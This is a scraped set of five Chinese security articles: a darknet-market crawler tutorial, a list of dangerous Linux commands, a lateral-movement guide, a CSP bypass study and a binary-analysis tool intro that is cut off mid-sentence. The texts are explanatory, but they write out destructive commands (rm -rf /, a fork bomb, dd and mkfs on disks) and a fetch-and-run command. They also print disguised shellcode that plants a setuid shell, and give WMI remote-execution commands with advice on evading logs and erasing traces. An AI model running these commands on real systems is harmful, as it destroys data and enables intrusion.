"5ccbfa584f2f0a0a7a69c052","喜大普奔！OnionScan0.2终于发布啦！在新版OnionScan中，最引人注目的一个新功能就是“custom crawls”（自定义爬取）。我们将会通过这篇文章来教会大家如何去","Kong","喜大普奔！OnionScan0.2终于发布啦！在新版OnionScan中，最引人注目的一个新功能就是“custom crawls”（自定义爬取）。我们将会通过这篇文章来教会大家如何去使用这个强大的功能。【OnionScan 0.2下载地址】可能对暗网比较了解的同学都知道OnionScan是个什么东西吧？OnionScan是一款非常棒的工具，你可以用它来扫描暗网中的隐藏服务，并收集一些潜在的泄漏数据。除此之外，OnionScan也可以帮助你搜索出各种匿名服务的标识，例如比特币钱包地址、PGP密钥、以及电子邮件地址等等。但是，暗网中的很多服务数据都是以非标准的数据格式发布的，不同的服务很可能使用的是不同的数据格式，这也就使得我们很难用软件工具来对这些数据进行自动化处理。不过别担心，OnionScan可以帮助我们解决这个难题。OnionScan允许我们自定义各个网站之间的关系，然后我们可以将这些关系导入至OnionScan的关联引擎（Correlation Engine）之中。接下来，系统会像处理其他标识符那样来帮助我们对这些关系进行关联和分类。接下来，我们以暗网市场Hansa来作为讲解实例。当我们在收集该市场中的数据时，我们首先要收集的往往是市场中处于在售状态的商品名称和商品类别，有时我们可能还需要收集这些商品的供应商信息。实际上，我们可以直接访问产品的/listing页面来获取所有的这些信息。但是，我们现在要自己动手制作一个暗网爬虫。我们将使用这个爬虫来爬取并导出我们所需的数据，然后再对这些数据进行处理，最后再将其转换成我们可以进行自动化分析的数据格式。在OnionScan0.2的帮助下，我们只需要定义一个简单的配置文件就可以轻松实现这些操作了。相关代码如下所示：{    ""onion"":""hansamkt2rr6nfg3.onion"",   ""base"":""/"",   ""exclude"":[""/forums"",""/support"",""/login"",""/register"",""?showFilters=true"",""/img"",""/inc"", ""/css"", ""/link"", ""/dashboard"",""/feedback"", ""/terms"", ""/message""],           ""relationships"":[{""name"":""Listing"",                     ""triggeridentifierregex"":""/listing/([0-9]*)/"",                     ""extrarelationships"":[                           {                             ""name"":""Title"",                             ""type"":""listing-title"",                              ""regex"":""&lt;h2&gt;(.*)&lt;/h2&gt;""                           },                           {                             ""name"":""Vendor"",                             ""type"":""username"",                             ""regex"":""&lt;a href=\""/vendor/([^/]*)/\""&gt;""                           },                           {                             ""name"":""Price"",                             ""type"":""price"",                             ""regex"":""&lt;strong&gt;(USD[^&lt;]*)&lt;/strong&gt;""                            },                           {                             ""name"":""Category"",                             ""type"":""category"",                             ""regex"":""&lt;li&gt;&lt;ahref=\""/category/[0-9]*/\""&gt;([^&lt;]*)&lt;/a&gt;&lt;/li&gt;"",                             ""rollup"": true                           }                     ]                    }                    ]}上面这段代码可能看起来非常的复杂，不过别担心，接下来我们会给大家一一进行讲解。代码开头的“onion”参数定义的是我们所要扫描的暗网服务（”onion”:”hansamkt2rr6nfg3.onion”）。“base”参数定义的是我们要从网站的哪个路径开始执行扫描，在这里我们准备从网站的根目录开始扫描（”base”:”/”）。与普通网站一样，大多数暗网服务同样只在网站子目录中才会保存有效数据，例如刚才的“listing”目录。在这种情况下，我们就可以使用“base”参数来告诉OnionScan从网站的哪一部分开始执行扫描，这样可以为我们节省大量的时间。“exclude”参数可以让OnionScan排除某些类型的扫描对象，例如“/forums”、“/support”、“/login”、以及“/register”。通常情况下，这些链接我们最好不要去碰，因为它们有可能会进行某些我们不希望发生的行为。接下来就是“relationships”参数了，这个参数中定义的逻辑才是这个爬虫最核心的部分。我们的逻辑关系主要是由“name”和“triggeridentifierregex”这两个参数定义的。其中的正则表达式主要应用于目标网站的URL地址，当正则表达式匹配到关系中的剩余规则时，就会触发相应的操作。在这个例子中，我们在OnionScan中定义了正则表达式“/listing/([0-9]*)/”，它将会触发URL地址中的Listing关系。需要注意的是，OnionScan还会根据URL地址中的“([0-9]*)”来识别资源之间的关系。每一个关系都有一个“extrarelationships”参数，这个参数中定义的关系是OnionScan在进行搜索操作时需要用到的。比如说，在我们的配置文件中，我们定义了四个额外的关系，即“Title”、“Vendor”、 “Price”和“Category”。每一个额外定义的关系都需要定义“name”和“type”参数，OnionScan的关联引擎将需要使用到这部分数据。除此之外，我们还要在关系中定义一个正则表达式，即“regex”参数，我们可以通过这个正则表达式来提取目标页面中的数据关系。在Hansa市场这个例子中可以看到，我们可以通过正则表达式“&lt;ahref=\”/vendor/([^/]*)/\”&gt;”来从产品的/listing页面中提取出厂商信息。类似地，我们也可以通过这种方法提取出产品的标题、价格、以及分类目录。“rollup”参数是OnionScan中的一个指令，这个指令可以让OnionScan对我们所搜索到的产品分类数量进行数据统计，并以可视化的形式输出统计结果。现在，我们已经通过配置文件来告诉OnionScan应该从Hansa市场中提取哪些数据了，但是OnionScan应该如何使用这个配置文件呢？接下来，先将我们刚才定义好的配置文件放到“service-configs”文件夹中，然后通过下列命令来让OnionScan对市场执行扫描操作：./onionscan -scans web --depth 1 --crawlconfigdir./service-configs/ --webport 8080 --verbose hansamkt2rr6nfg3.onion搜索结果如下图所示：从上面这张图片中可以看到，我们只需要定义一个简单的配置文件，OnionScan就可以帮我们完成剩下的操作。我们之所以可以获取到这张统计表格，是因为我们之前将“rollup”参数设为了“true”，所以OnionScan才会给我们提供这样一份可视化的统计数据。这只是新版OnionScan的一个简单应用，各位同学可以使用这样的方法来从其他的暗网服务中搜索你们所需要的信息。OnionScan还有很多强大的功能，如果你对这一话题感兴趣的话，欢迎到本项目的GitHub主页中留言讨论【GitHub传送门】。","2016-11-10 20:13:29","Web安全","用好OnionScan，自己动手制作暗网爬虫","http://nsoad.com/Article/web/20161110/738.html"
"5ccbfa584f2f0a0a7a69c053","Linux命令是一种很有趣且有用的东西，但在你不知道会带来什么后果的时候，它又会显得非常危险。所以，在输入某些命令前，请多多检查再敲回车。","kong","Linux命令是一种很有趣且有用的东西，但在你不知道会带来什么后果的时候，它又会显得非常危险。所以，在输入某些命令前，请多多检查再敲回车。    rm –rfrm –rf是删除文件夹和里面附带内容的一种最快捷的方法，但是细微的错误或者语法认知不到位，就可能对系统造成不可恢复的破坏，下面给出一些案例：rm  删除linux下的文件rm -r 递归删除文件夹，包括空文件夹rm -f 强制无条件删除只读文件rm -rf / : 强制无条件删除root目录下所有内容。rm -rf * : 强制无条件删除当前目录下所有内容。rm -rf . : 强制无条件删除当前文件夹和子文件夹综上所述，在你执行rm –rf命令时千万要小心，大家可以在.bashrc里面添加：alias rm= 'rm -i'这样，在你下次删除东西的时候，它会提醒你到底要删啥。:( ){:|:&amp;};:这个命令其实是一种fork炸弹，它定义了一个叫“：”的函数，调用了自己两次，一次是在前台，一次是在后台。关键是这样的调用会无限循环，直到系统崩溃。手贱的同学可以尽管在虚拟机里试试： :( ){:|:&amp;};:任意命令 &gt; /dev/sda这个例子是讲，我们执行了任意命令，并输出到/dev/sda。这样的话，/dev/sda 里面的文件会被命令输出的内容全部替换掉，最后丢失掉其中原有的数据。mv 指定的文件夹 /dev/null这个mv命令会把指定的文件夹移动到/dev/null。在linux下，/dev/null或null是一种特殊的文件，它们会把写入自身的数据全部丢弃，再返回操作成功的消息。# mv /home/user/* /dev/null上面的命令会把/home/user/下面所有的内容，全部移动到/dev/null，这就是个无底的神坑。wget http://malicious_source -O- | sh这个命令可能会直接下载恶意的源文件，然后使用sh直接执行该脚本。mkfs.ext3 /dev/sda上面的例子会格式化/dev/sda，在执行上面的命令后，你的硬盘驱动会被标记为新的。当然，这时系统是无法再恢复数据了。&gt; 任意文件这个命令可以用来刷掉原文件里的内容，如果你不小心打错了字，输入了诸如下面的命令：&gt; xt.conf你系统配置文件里的内容可能就会因此被清理掉。^foo^bar这样利用^符号，通过上翻补全命令的方式，直接编辑之前运行过的命令。虽然你或许因此不用再输入整条长命令，但其实这会很危险。dd if=/dev/random of=/dev/sdadd命令会擦掉/dev/sda下面的内容，然后写入随机的垃圾数据，最后你的系统会受到不可逆转的破坏。隐藏命令下面的命令相当于rm –rf，它会藏在十六进制hex中。大家在不知情的情况下运行它，可能就会直接擦除掉整个root目录：char esp[] __attribute__ ((section(“.text”))) /* e.s.prelease */= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″“\x6e\x2f\x73\x68\x00\x2d\x63\x00″“cp -p /bin/sh /tmp/.beyond; chmod 4755/tmp/.beyond;”;这个故事告诉我们，致命的威胁在隐藏起来的时候，我们通常可能难以发现。","2016-12-08 21:02:00","系统安全","运维请注意：”非常危险“的Linux命令大全","http://nsoad.com/Article/system/20161208/901.html"
"5ccbfa584f2f0a0a7a69c054","这篇文章不是给 PHP 程序员看的，而是给渗透测试爱好者准备的，\(￣︶￣*\))。本文不是 PHP 教程，本文只针对 PHP 的各种奇淫技巧进行整理和证明，在进行渗透测试（WEB 安全","kong","0. 前言在渗透测试时，很多人还是在使用PSEXEC类工具。PSEXEC类的工具有各种语言的实现，如Metasploit的psexec psexec_psh，Impacket psexec，pth-winexe，Empire Invoke-Psexec，最早Sysinternals公司pstools工具包当中的psexec。 这些工具都非常出色，但经过这么多年的发展，在各种防御软件环境下psexec类工具很多时候已经无法开展渗透测试工作。在win下要想执行命令有几种方法:IPC上传at&amp;schtasks远程执行PSEXEC 这也是用的最多，但是会留下痕迹WMI 最安全方法，没有任何知觉，所有window系统启用服务，但防火墙开启将会无法连接PsRemoting posershel远程执行命令1. PSEXECPSEXEC执行原理通过ipc$连接，然后释放psexesvc.exe到目标机器。通过服务管理SCManager远程创建psexecsvc服务，并启动服务。客户端连接执行命令，服务端启动相应的程序并执行回显数据。这里描述的是Sysinternals中的psexec，不过MSF、Impacket、pth 工具中的psexec用的都是同种思路。为什么丢弃PSEXECpsexec类工具会释放文件，特征明显，专业的杀毒软件都能检测到。需要安装服务，会留下日志，并且退出时偶尔会出现服务不能删除的情况。需要开启admin$ 445端口共享。在事后攻击溯源时，调查人员会通过日志信息来推测出你的攻击过程。但是它的优点在于，能直接给我们提供目标主机的system权限。2. 使用WMI来执行命令WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统。当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。越来越多的APT事件中也出现了WMI攻击的影子，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。最开始我不太喜欢WMI，因为通过WMI执行的命令是没有回显的，这会带来很大的不便。不过在HES2014上有研究者提出了回显的思路，加上psexec类的攻击已被很多的杀软查杀，研究下WMI攻击还是很有必要的。《WMI SHELL》 - new way to get shells on remote Windows machines using only the WMI service常见的WMI攻击工具有这些PTH-WMIS (最早wmi攻击的工具，单条命令执行，无回显，需要pth-smbget配合读取结果)impackets wmiexec(Linux跨window经常用)wmiexec.vbs (国人制造 为了回显会写文件)Invoke-WmiCommand&amp;Invoke-PowerShellWmiwindow本地的测试工具wmic默认情况下是无法得到回显的，显然这不是我们想要的wmic /node:192.168.38.137 /user:administrator /password:123456 process call create cmd.exe使用wmiexec.vbs执行命令测试。 使用impackets wmiexec执行命令测试，执行命令可以回显。在Linux跨window渗透时候经常使用。wmiexec.py administrator:pass@192.168.38.1373. 使用PsRemoting来执行命令PowerShell远程命令执行基于WinRM。WinRM指的是Windows远程管理服务，它会监听HTTP(5985)、HTTPS(5986)，不过此服务除了Windows Server 2012及R2默认启用外，其他默认都是禁用的。管理员为了方便对服务器的远程管理，也许将此端口开启，这种事就像内网弱口令一样，做渗透嘛，什么奇迹都有可能发生。 利用PowerShell渗透可以绕过杀软、绕过白名单防护设备，并且还可以得到返回的数据，简直是杀人越货神器。但由于默认禁用的原因，在内网渗透测试时，我暂时还未使用过这种技术。Enter-PSSession 192.168.38.137 -Credential  administrator4. 总结其实说了这么多，在内网渗透的时候更推荐使用WMI。WMI的好处有很多，但WMI也不是万能的，还是需要根据具体的网络环境来调整渗透手法，渗透测试过程中要牢记擦掉自己痕迹，不使用ARP等动静特别大攻击手法。对于不知道psexec执行会留下什么痕迹的同学可以看看 http://bobao.360.cn/learning/detail/3186.html。昨天刚和同事讨论研究完psexec的执行过程后便发现这篇文章，但是它没有讲清其执行原理。","2016-11-18 12:42:36","Web安全","丢掉PSEXEC来横向渗透","http://nsoad.com/Article/web/20161118/802.html"
"5ccbfa584f2f0a0a7a69c055","从两个工具说起最近Google又推出了两款有关CSP利用的小工具，其一为CSP Evaluator，这是一个能够评估你当前输入的CSP能否帮助你有效避免XSS攻击的工具，其用法非常简单，在","silence","从两个工具说起最近Google又推出了两款有关CSP利用的小工具，其一为CSP Evaluator，这是一个能够评估你当前输入的CSP能否帮助你有效避免XSS攻击的工具，其用法非常简单，在输入框中输入你当前设置或将要设置的CSP值，选择需要验证的CSP版本，然后按下“CHECK CSP”即可。不知道CSP是什么的同学，可以看下阿里聚安全博客以前推送的一篇文章《Content Security Policy 入门教程》下面的列表中会给出评估工具对你输入CSP的安全性评估，所有条目用不同颜色标记了可能的影响程度。并且每个条目都可以单击展开详情，以按照建议修复可能存在的缺陷。如图：CSPEvaluator还存在一个Chrome插件版本，同样易于使用。在使用了CSP的网站上单击扩展图标就可以自动对当前页面的CSP进行评估。另一款工具为CSP Mitigator，这款Chrome插件允许您将自定义CSP策略应用于应用程序。 它可以帮助您了解启用CSP的后果，识别与您的策略不兼容的应用程序部分，并指导您在部署前进行任何必要的更改。效果图在Chrome商店中有，这里就不再赘述了。可以看到，Google仍然在不遗余力地推行CSP的发展与应用。在CSP Evaluator的页面中，我们看到Google相关团队进行了一项规模巨大的研究来对CSP的现状进行了深入的分析，并基于这些结果，剖析了CSP的优缺点，并对CSP未来的发展给出了结论。就让我们跟随这篇文章，来看看CSP在今世的表现与CSP的未来是否可以期待。庐山真面目 —— 何为CSP为了研究CSP（Content Security Policy）对XSS攻击的防护作用，他们做了对CSP安全模型的首次深入分析，分析了CSP标准中对web缺陷的保护能力，帮助识别常见的CSP策略配置的可能错误，并且展示了三类能使CSP无效化的绕过方法。这次研究所采用的材料基于从Google搜索的索引文件中所提取到的CSP策略，从语料库中提取了大约1060亿页的页面，其中39亿是受CSP保护的，其中确认了26,011个独立的策略。他们发现，由于策略配置错误和白名单条目不安全，这些策略中至少有94.72％无法缓解XSS攻击。基于这样的研究结果，他们建议在实践中部署CSP时，使用基于nonce的方法而不是传统的白名单。并且，他们提出了名为“strict dynamic”的新特性，这是当前在Chromium浏览器中实现的CSP3规范的一个新特性。以下会详细讲述为何要使用这种策略和特性。首先，何为CSP？我们知道，内容安全策略（CSP）是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少它们的应用程序执行的特权”。当前，CSP还处在快速的发展期，目前正在进行规范中的版本是CSP3，CSP标准由用户代理选择实现。例如，Chromium具有完整的CSP2支持，并且实现了CSP3的大部分工作草案，仅在某些情况下可能会落后于实验中的某些特性，而MozillaFirefox和基于WebKit的浏览器则刚刚获得了完整的CSP2支持。在实际使用中，CSP策略在Content-Security-Policy HTTP响应头或元素中提供。CSP的能力可以分为三类：1. 资源加载限制。CSP的最广为人知和常用的方面是将各种子资源的加载限制到开发人员允许的一组源的能力，这组源称为源列表。 常用的指令是script-src，style-src，img-src和兜底的 default-src; 调节资源的指令的完整列表如下表1所示。作为特殊情况，script-src和style-src指令还有几个额外的配置选项可用; 这些选项允许对脚本和样式表进行更细粒度的控制。2. 基于URL的限制。某些类型的攻击不能通过管理子资源来防止，但与之类似，对于文档也需要有可以与之交互的可信来源的概念。 一个常见的例子是frameancestors指令，它定义了允许的框架来源，以防止点击劫持。 类似地，base-uri和form-action定义哪些URL可以是和元素的目标，以防止一些Post XSS攻击。3. 杂项限制和强化选项。由于在Web应用程序中缺乏能够启用安全限制的其他常见机制，CSP已经成为几个松散适用的安全功能的集合。这些功能包括block-all-mixed-content和upgrade-insecurerequests，它们可以防止HTTPS混合内容错误并帮助改进HTTPS支持; plugin-types能够限制允许的插件格式; 还有sandbox，它反映了HTML5沙箱框架的安全功能。通过这些能力我们可以看出，目前的CSP提供了对三种类型漏洞的保护功能：XSS：XSS攻击能在一个脆弱的应用程序中注入并执行不受信任的脚本（用script-src和object-src指令来进行保护）Clickjacking：Clickjacking通过在攻击者控制的页面上覆盖隐藏的框架来迫使用户在受影响的应用程序中执行不想要的操作。（通过限制框架嵌入和 frame-ancestors指令来保护）Mixed content：Mixedcontent意味着在通过用HTTPS传递的页面上使用不安全协议加载资源（使用upgrade-insecure-requests和blockall-mixed-content关键字进行保护，限制将脚本和敏感资源加载到https网页中)曲径通幽处 —— 如何绕过CSP在谈论CSP带来的好处之前，我们需要注意到。由于一些比较受欢迎的用户代理（浏览器）还不支持或者仅对CSP提供部分支持，所以如果应用仅仅依赖CSP作为深度防御的手段会很容易让安全机制完全失败。因此，在使用CSP之外还必须采用传统保护机制; 例如，在生成HTML代码时使用带有严格上下文转义的框架，使用X-Frame-OptionsHeader以防止点击劫持，并确保资源在安全页面上通过HTTPS协议获取。请务必记住，设置CSP的实际好处是，当主要的安全机制不够用时，CSP可以在开发人员引入编程错误时保护用户远离可能导致的XSS，点击劫持或者混合内容错误。事实上，由于点击劫持可以通过X-Frame-Options来避免，而混合内容错误在现代浏览器中已经默认被阻止了。因此CSP作为标准被提出的最主要目的，就是用于防护XSS攻击。而XSS，也正是既能通过CSP来缓解，又是开发者经常容易引入应用的错误。在实现用CSP防止不必要的脚本执行时，我们制定的策略必须满足三个要求：1. 策略必须同时定义script-src和object-src（或者使用default-src来补全），在缺少任意一项时均可以被绕过：2. script-src的源列表不能包含unsafe-inline关键词（除非使用nonce）或者允许data: URI，否则可以被绕过：3. script-src和object-src源列表不能包含含有攻击者可控制response的安全相关部分的源地址，或包含不安全的库。否则可以被绕过：如果以上任意一条没有被满足的话，整个CSP对于XSS的防护就会彻底失效。由于CSP的基本假设之一就是在策略白名单中的域名只会提供安全的内容，因此从理论上来说攻击者不应该能够将有效的JavaScript注入到白名单里来源的响应中。然而在实践中，我们发现现代web应用程序往往会因为几种模式违反这个假设。1. JavaScript带有用户可控的回调：某些JSONP函数接受用户传递的函数名，但未做严格的过滤，导致可以注入任意JavaScript代码执行，即使做了基本的过滤，也可能使用SOME攻击来注入任意函数名：2. 反射或者符号执行：CSP对于脚本执行的限制可能（通常是意外地）被白名单中的脚本所规避。例如，脚本可以使用反射来查找和调用全局作用域中的函数，如图：通常情况下这些函数不会有太大危害，因为参数是开发人员所控制的。然而当函数从DOM获取数据，而应用又有DOM注入的漏洞，则很可能被攻击者完全控制函数及其参数。一个典型的例子是目前流行的AngularJS库，它具有强大的模板语法和客户端模板执行：默认情况下AngularJS会通过eval来执行代码，在特定的不允许eval的CSP场景下，AngularJS也支持使用“CSP compatibility mode” (ng-csp)来执行模板的代码。攻击者只需要从白名单中的域名里引入AngularJS，就可以在页面上通过注入ng-app标签来编写能够执行任意JavaScript代码的模板。3. 意料之外的可被当做的JavaScript来解析的响应：通过浏览器对MIME的检查宽松来执行任意js，比如伪造脚本响应类型。如果被黑客控制响应的话，在白名单中script-src和object-src都可能存在隐患。4. 作为安全手段的路径限制：CSP2中的whitelist可以指定路径（目录），然而如果白名单中的条目包含30X重定向，且能被黑客控制，则可以绕过CSP。最常见于OAuth中，或被用于防止referer丢失。古来圣贤皆寂寞 —— CSP的应用现状为了找出互联网中有多少CSP策略能够切实有效地防护XSS攻击，Google团队构造了一些数据集并进行了标准化处理。根据我们以上的结论，想要达到好的XSS防护效果，CSP的XSS保护策略必须处在强制模式下，并且至少包含以下两个指令之一：script-src或default-src。因此可以据此确定含有XSS防护的CSP策略。对于策略的安全性检查，他们采用了如下几种方式检验：对于”unsafe-inline”的使用：对于一个使用了“unsafe-inline”并且没有使用nonce的策略，可以认为是很容易被绕过的。缺少“object-src”：一个指定了“script-src”策略但是没有指定“object-src”（同时也没有“default-src”）的策略，是很容易用plugin绕过的。在白名单中使用通配符：在白名单中使用通配符，或者使用URI Scheme很容易引起包含任意域名内容。白名单中包含不安全的来源：如果白名单中的来源可能存在CSP Bypass，则也是不安全的。对于如何检查存在CSP bypass的域名，我们定义为：托管了AngularJS的域名，因为AngularJS允许在模板中执行任意代码。暴露了JSONP接口的域名（可以使用JSONP任意定义js代码，或者SOME攻击自定义函数名）。在进行了一系列数据的处理和分析之后，他们得到的结论是。在数据集中，有3,913,578,446（3.7％）个网址采用了CSP。 所有主机名中的1,664,019（0.16％）采用了CSP。他们将整个数据集分为3类：所有策略XSS-Protection 策略（至少含有script-src，object-src或者default-src之一）严格XSS-Protection策略（在2的基础上，不含unsafe-inline，unsafe-eval等，且URI Scheme，或者白名单通配符）在此基础上，得到了目前互联网上CSP安全的总览：所有策略数据中的94.72%并没有提供XSS防护在所有提供XSS防护的数据中，有94.68%可以被绕过在所有提供XSS防护的数据中，有87.3%指定了unsafe-inline并且没有部署nonce在所有提供XSS防护的数据中，有9.4%既没有指定object-src，也没有default-src在所有提供XSS防护的数据中，有21.48%使用了通配符或者URI Scheme在忽略3,5的情况下，仍有51.05%的可以被绕过。有些是因为4，更多的是因为script-src中的白名单中包含了不安全的域通过对于所得到的对XSS有效的CSP防护策略的分析，我们得到了白名单的安全性如下：白名单数量越大，越难保证JSONP和AngularJS造成的安全问题大概在严格策略中的41.65%，所有XSS防护策略中的79.17%，包含不安全的白名单在使用12条白名单时，绕过率达到了94.8%作为结果，我们得出的结论是，部署传统的基于白名单的CSP模型中防止XSS是不可行的，因为在实践中脚本执行限制通常可以被推翻。可以看出，script-src的白名单是造成CSP失效的最大原因（除了没配置好的unsafe-inline和缺少object-src之外）。因此，我们应该如何改进CSP呢。其实CSP已经提供了更精细的方法来对信任脚本：加密随机数（cryptographic nonce）和哈希（hash）。 特别是nonces允许开发人员明确地注解每个受信任的脚本（不论内联和外部），同时禁止攻击者注入的脚本执行。 为了提高CSP的整体安全性，Google据此提出了一种稍微不同的策略写法。 应用程序维护者应该应用基于nonce的保护方法，而不是依赖白名单。 以下列表描述了基于白名单的CSP策略和满足此策略的脚本：可以看出，白名单中包含了一个不安全的域名，因此所述CSP的策略就是不安全的。攻击者可以通过JSONP暴露出的点来注入恶意代码： https://example.org/scriptcallback=malicious_code.江山代有才人出 —— 全新的CSP策略为了防止这种事情的发生，我们使用nonce来定义策略。在nonce中，应用程序定义并生成了单一的，不可猜测的令牌（nonce），这个令牌会同时传递给CSP策略和作为一个合法HTML属性传递给script。 用户代理仅允许执行那些nonce值能够匹配策略中指定的值的脚本。虽然攻击者可以将标记注入易受攻击的页面，但是由于不知道nonce的临时值，因此他并不能执行恶意脚本。通过使用nonce，可以单独将脚本列入白名单。 即使攻击者能够定位XSS，nonce的值也是不可预测的，因此攻击者不可能向JSONP注入有效脚本。而且由于浏览器支持多个策略，因此可以把nonce和whitelist一起写，用逗号隔开。nonce可以用来将各个脚本列入白名单，而whitelist可以用于集中实施安全策略。那么，当我们生成动态脚本并插入时会发生什么呢？因为新生成的，被插入到页面的js并不知道nonce的值，所以会被拦截，因此需要CSP3里的 script-src: ’strict-dynamic’。 ’strict-dynamic’允许将信任关系传递给动态生成的脚本，也就是说，“strict-dynamic”允许js动态添加的脚本执行，而忽略script-src的白名单。并且，其他的script-src白名单会被忽略，浏览器不会执行静态或解析器插入的脚本，除非它伴随有效的nonce值。这里的关键点是，使用createElement()来插入js时，能够执行createElement()的js已经被信任了，并且黑客不知道nonce的时候无法注入恶意脚本。因此我们可以信任新建的js代码。举例，我们可以这么写CSP：使用这样的策略时，开发者将需要向静态&lt;script&gt;元素添加nonce，但是会确保只有这些受信任的脚本及其后代才会执行脚本。这种部署CSP的模式可以显著地提高策略的安全性并促进大家使用。当然，Nonce-based 策略并不是XSS的灵丹妙药，它也有它的局限性。首先，从安全性来说：1、如果XSS的根本原因是将URI中的不受信任数据传递到script的src属性中，并且通过createElement创建，那么strict-dynamic策略将允许其执行，反而是传统的whitelist会阻止它。2、如果在noncedscript标签中有注入点，那么攻击者仍然可以执行攻击。（这点传统CSP也一样）3、Post-XSS/scriptlessattacks，仍然无法防御。而从兼容性角度来说：1、对于解析器插入的脚本：如果使用document.write()来插入脚本，会被strict-dynamic策略阻止。使用者必须使用createElement()或者在document.write()创建的脚本中显式传递一个nonce2、内联事件处理程序：strict-dynamic不会花费时间去移除和CSP不兼容的标记（例如javascript: 开头的URL，或者内联的事件处理程序），开发者需要自己去重构。3、针对Google内部数据集的几百个XSS案例的分析表明绝大部分的XSS攻击都能被 nonce-based策略所减轻，并且这种策略明显比白名单更容易被开发人员接受。以一片希望结尾最后，总结一下Google这次调研的结论。他们对CSP的安全模型进行了深入分析，并确定了其中看似安全的策略没有提供安全改进。他们在超过10亿个主机名中调查了CSP的采用情况，并在Google搜索索引中确定了160万个主机在使用26,011个独特的策略。通过自动化检查，发现所有策略中的94.72%能被轻易绕过。所有策略中的75.81%和严格策略中的41.65%在白名单中也至少包括一个不安全主机。正是这些数字让我们相信白名单是不切实际的。因此，Google提出一个新的策略方式。建议使用单个脚本的CSP nonces代替整个主机列入白名单的方式。并且，为了简化基于nonce的CSP，提出了strict-dynamic关键字。启用了这个关键字的网站在浏览器中会继承nonce到动态脚本中。因此，一个受nocne信任的脚本在运行中所执行的新脚本是被信任的。虽然这种技术脱离了传统的主机白名单方法的CSP，但他们认为可用性改进足够大到足以证明其广泛采用。希望基于nonce的方法的组合和’strict-dynamic’关键字将允许开发人员和组织最终能够享受由内容安全策略提供的真正的安全利益。在看到Google煞费苦心的这么多帮助推广CSP部署的工具，以及认真的深度调研后，我坚信CSP的今世可能还未能尽如人意，但是未来在Google以及其它各家标准制定者的大力推动下，改进后的CSP必能够在现代浏览器的XSS防御中大放异彩。","2016-10-23 16:27:06","Web安全","CSP的今世与未来","http://nsoad.com/Article/web/20161023/627.html"
"5ccbfa584f2f0a0a7a69c056","在计算机科学和软件工程学科的众多领域中，从软件安全程序分析到逆向工程，二进制代码的分析是很关键的行为。而手动进行二进制分析是一个困难....","Kong","项目地址：https://github.com/programa-stic/barf-project/在计算机科学和软件工程学科的众多领域中，从软件安全程序分析到逆向工程，二进制代码的分析是很关键的行为。而手动进行二进制分析是一个困难又耗时的任务，因此便有了一些给分析人员准备的自动化分析工具。然而，这些大多数工具具有若干技术和商业上的限制，限制了大部分学术和从业者社区的访问和使用。BARF 是一款二进制分析框架，旨在支持信息安全学科中常见的大量的二进制代码分析任务。它是一个可编写脚本的平台，支持从多种架构中提取指令，提供了从二进制翻译到中间表示，用于代码分析的插件和能与外部工具（如调试器）交互的可扩展框架， SMT 求解器以及一些指令工具等。该框架主要用于辅助分析者，但它完全可以自动化。BARF 项目包括了 BARF 和相关工具包。到目前为止，该项目由以下项目组成：BARF : 跨平台开源二进制分析和逆向工程框架。PyAsmJIT : 用于 Intel x86_64 和 ARM 架构的 JIT 编译器。基于 BARF 的 工具:BARFgadgets : 在二进制程序中搜索，分类并校验 ROP 的小程序。BARFcfg : 恢复二进制程序功能的控制流图。BARFcg : 回复二进制程序函数的调用图。更多相关信息参考：BARF: A multiplatform open source Binary Analysis and Reverse engineering Framework (Whitepaper) [en]BARFing Gadgets (ekoparty2014 presentation) [es]当前版本信息： v0.3URL： https://github.com/programa-stic/barf-project/releases/tag/v0.3Change Log：https://github.com/programa-stic/barf-project/blob/v0.3/CHANGELOG.md所有包均在 Ubuntu 16.04 (x86_64) 进行测试BARFBARF 是用于二进制分析和逆向工程的 Python 包。支持以下特性：加载不同类型的二进制程序（ELF, PE等）支持 32 位和 64 位的 Intel x86 架构支持 32 位的 ARM 架构运行在中间语言（REIL），因此所有分析算法是与架构无关的与 Z3 和 CVC4 SMT 求解器集成，这意味着你可以将代码片段表述为公式，并检查对它们的限制。相关功能仍在开发中。安装BARF 需要以下依赖：Z3 : A high-performance theorem prover being developed at Microsoft Research.CVC4 : An efficient open-source automatic theorem prover for satisfiability modulo theories (SMT) problems.在系统上安装 BARF：sudo python setup.py install 本地用户安装：$ sudo python setup.py install --user快速入门下面一个简单的例子显示了如何打开一个二进制文件，并打印每条指令的中间翻译（REIL）。from barf import BARF# Open binary file.barf = BARF(""examples/bin/x86/branch1"")# Print assembly instruction.for addr, asm_instr, reil_instrs in barf.translate():      print(""0x{addr:08x} {instr}"".format(addr=addr, instr=asm_instr))    # Print REIL translation.    for reil_instr in reil_instrs:        print(""{indent:11s} {instr}"".format(indent="""", instr=reil_instr))我们还可以恢复 CFG 并保存到 .dot 文件。# Recover CFG.cfg = barf.recover_cfg()# Save CFG to a .dot file.cfg.save(""branch1_cfg"")  我们可以使用 SMT 解算器代码检测限制，比如以下代码： 80483ed:       55                      push   ebp 80483ee:       89 e5                   mov    ebp,esp 80483f0:       83 ec 10                sub    esp,0x10 80483f3:       8b 45 f8                mov    eax,DWORD PTR [ebp-0x8] 80483f6:       8b 55 f4                mov    edx,DWORD PTR [ebp-0xc] 80483f9:       01 d0                   add    eax,edx 80483fb:       83 c0 05                add    eax,0x5 80483fe:       89 45 fc                mov    DWORD PTR [ebp-0x4],eax 8048401:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4] 8048404:       c9                      leave 8048405:       c3                      ret你想知道必须分配什么值给内存位置 ebp-0x4，ebp-0x8,ebp-0xc 